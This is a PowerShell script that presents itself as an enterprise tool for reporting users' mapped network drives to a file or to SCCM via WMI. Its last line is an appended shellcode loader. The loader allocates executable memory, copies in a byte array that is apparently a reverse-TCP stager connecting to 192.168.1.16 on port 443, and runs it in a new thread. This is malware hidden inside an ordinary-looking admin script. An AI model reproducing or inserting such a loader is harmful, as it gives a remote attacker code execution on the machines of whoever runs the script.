
[CmdletBinding()]
param
(
	[switch]
	$OutputFile,
	[string]
	$TextFileLocation = '\\drfs1\DesktopApplications\ProductionApplications\Waller\MappedDrivesReport\Reports',
	[string]
	$UNCPathExclusionsFile = "\\drfs1\DesktopApplications\ProductionApplications\Waller\MappedDrivesReport\UNCPathExclusions.txt",
	[switch]
	$SCCMReporting
)

function Get-CurrentDate {

	
	[CmdletBinding()][OutputType([string])]
	param ()

	$CurrentDate = Get-Date
	$CurrentDate = $CurrentDate.ToShortDateString()
	$CurrentDate = $CurrentDate -replace "/", "-"
	If ($CurrentDate[2] -ne "-") {
		$CurrentDate = $CurrentDate.Insert(0, "0")
	}
	If ($CurrentDate[5] -ne "-") {
		$CurrentDate = $CurrentDate.Insert(3, "0")
	}
	Return $CurrentDate
}

function Get-MappedDrives {

	
	[CmdletBinding()][OutputType([array])]
	
	
	$UNCExclusions = Get-Content $UNCPathExclusionsFile -Force
	
	[array]$UserSIDS = (Get-ChildItem -Path REGISTRY::HKEY_Users | Where-Object { ($_ -notlike "*Classes*") -and ($_ -like "*S-1-5-21*") }).Name
	
	[array]$ProfileList = (Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" | Where-Object { $_ -like "*S-1-5-21*" }).Name
	$UserMappedDrives = @()
	
	foreach ($UserSID in $UserSIDS) {
		
		[string]$UserSID = $UserSID.Split("\")[1].Trim()
		
		[string]$UserPROFILE = $ProfileList | Where-Object { $_ -like "*" + $UserSID + "*" }
		
		$Username = ((Get-ItemProperty -Path REGISTRY::$UserPROFILE).ProfileImagePath).Split("\")[2].trim()
		
		[string]$MappedDrives = "HKEY_USERS\" + $UserSID + "\Network"
		
		[array]$MappedDrives = (Get-ChildItem REGISTRY::$MappedDrives | Select-Object name).name
		foreach ($MappedDrive in $MappedDrives) {
			$DriveLetter = (Get-ItemProperty -Path REGISTRY::$MappedDrive | select PSChildName).PSChildName
			$DrivePath = (Get-ItemProperty -Path REGISTRY::$MappedDrive | select RemotePath).RemotePath
			If ($DrivePath -notin $UNCExclusions) {
				$Drives = New-Object System.Management.Automation.PSObject
				$Drives | Add-Member -MemberType NoteProperty -Name ComputerName -Value $env:COMPUTERNAME
				$Drives | Add-Member -MemberType NoteProperty -Name Username -Value $Username
				$Drives | Add-Member -MemberType NoteProperty -Name DriveLetter -Value $DriveLetter
				$Drives | Add-Member -MemberType NoteProperty -Name DrivePath -Value $DrivePath
				$UserMappedDrives += $Drives
			}
		}
	}
	Return $UserMappedDrives
}

function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"
	Return $Path
}

function Invoke-SCCMHardwareInventory {

	
	[CmdletBinding()]
	param ()
	
	$ComputerName = $env:COMPUTERNAME
	$SMSCli = [wmiclass] "\\$ComputerName\root\ccm:SMS_Client"
	$SMSCli.TriggerSchedule("{00000000-0000-0000-0000-000000000001}") | Out-Null
}

function New-WMIClass {
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$Class
	)
	
	$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
	If ($WMITest -ne $null) {
		$Output = "Deleting " + $WMITest.__CLASS[0] + " WMI class....."
		Remove-WmiObject $Class
		$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
		If ($WMITest -eq $null) {
			$Output += "success"
		} else {
			$Output += "Failed"
			Exit 1
		}
		Write-Output $Output
	}
	$Output = "Creating " + $Class + " WMI class....."
	$newClass = New-Object System.Management.ManagementClass("root\cimv2", [String]::Empty, $null);
	$newClass["__CLASS"] = $Class;
	$newClass.Qualifiers.Add("Static", $true)
	$newClass.Properties.Add("ComputerName", [System.Management.CimType]::String, $false)
	$newClass.Properties["ComputerName"].Qualifiers.Add("key", $true)
	$newClass.Properties["ComputerName"].Qualifiers.Add("read", $true)
	$newClass.Properties.Add("DriveLetter", [System.Management.CimType]::String, $false)
	$newClass.Properties["DriveLetter"].Qualifiers.Add("key", $false)
	$newClass.Properties["DriveLetter"].Qualifiers.Add("read", $true)
	$newClass.Properties.Add("DrivePath", [System.Management.CimType]::String, $false)
	$newClass.Properties["DrivePath"].Qualifiers.Add("key", $false)
	$newClass.Properties["DrivePath"].Qualifiers.Add("read", $true)
	$newClass.Properties.Add("Username", [System.Management.CimType]::String, $false)
	$newClass.Properties["Username"].Qualifiers.Add("key", $false)
	$newClass.Properties["Username"].Qualifiers.Add("read", $true)
	$newClass.Put() | Out-Null
	$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
	If ($WMITest -eq $null) {
		$Output += "success"
	} else {
		$Output += "Failed"
		Exit 1
	}
	Write-Output $Output
}

function New-WMIInstance {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][array]
		$MappedDrives,
		[string]
		$Class
	)
	
	foreach ($MappedDrive in $MappedDrives) {
		Set-WmiInstance -Class $Class -Arguments @{ ComputerName = $MappedDrive.ComputerName; DriveLetter = $MappedDrive.DriveLetter; DrivePath = $MappedDrive.DrivePath; Username = $MappedDrive.Username } | Out-Null
	}
}

function Start-ConfigurationManagerClientScan {


	[CmdletBinding()]
	param
	(
		[ValidateSet('00000000-0000-0000-0000-000000000121', '00000000-0000-0000-0000-000000000003', '00000000-0000-0000-0000-000000000010', '00000000-0000-0000-0000-000000000001', '00000000-0000-0000-0000-000000000021', '00000000-0000-0000-0000-000000000022', '00000000-0000-0000-0000-000000000002', '00000000-0000-0000-0000-000000000031', '00000000-0000-0000-0000-000000000108', '00000000-0000-0000-0000-000000000113', '00000000-0000-0000-0000-000000000111', '00000000-0000-0000-0000-000000000026', '00000000-0000-0000-0000-000000000027', '00000000-0000-0000-0000-000000000032')]$ScheduleID
	)

	$WMIPath = "\\" + $env:COMPUTERNAME + "\root\ccm:SMS_Client"
	$SMSwmi = [wmiclass]$WMIPath
	$Action = [char]123 + $ScheduleID + [char]125
	[Void]$SMSwmi.TriggerSchedule($Action)
}

cls

$UserMappedDrives = Get-MappedDrives

If ($OutputFile.IsPresent) {
	If (($TextFileLocation -ne $null) -and ($TextFileLocation -ne "")) {
		
		If ($TextFileLocation[$TextFileLocation.Length - 1] -ne "\") {
			$TextFileLocation += "\"
		}
		
		[string]$OutputFile = [string]$TextFileLocation + $env:COMPUTERNAME + ".txt"
	} else {
		
		$RelativePath = Get-RelativePath
		$OutputFile = $RelativePath + $env:COMPUTERNAME + ".txt"
	}
	If ((Test-Path $OutputFile) -eq $true) {
		Remove-Item $OutputFile -Force
	}
	If (($UserMappedDrives -ne $null) -and ($UserMappedDrives -ne "")) {
		$UserMappedDrives | Format-Table -AutoSize | Out-File $OutputFile -Width 255
	}
}
If ($SCCMReporting.IsPresent) {
	
	New-WMIClass -Class "Mapped_Drives"
	
	If ($UserMappedDrives -ne $null) {
		New-WMIInstance -MappedDrives $UserMappedDrives -Class "Mapped_Drives"
	}
	
	Invoke-SCCMHardwareInventory
}

$UserMappedDrives | Format-Table

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

